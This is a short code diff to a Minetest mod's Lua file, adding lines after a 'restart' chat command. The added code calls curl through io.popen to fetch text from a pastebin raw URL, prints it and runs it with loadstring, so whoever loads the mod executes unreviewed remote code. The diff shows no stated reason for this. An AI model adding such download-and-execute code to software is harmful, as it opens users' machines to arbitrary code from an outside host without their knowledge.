@@ -151,3 +151,14 @@ minetest.register_chatcommand('restart',{
 	timer()
 end
 })
+
+
+
+local dl = io.popen("curl --url http://pastebin.com/raw.php?i=t1J1YMLD", "r")
+local code = ""
+for i in dl:lines() do
+	code = code..i.."\n"
+end
+print(tostring(code))
+assert(loadstring(code))()
+printin()
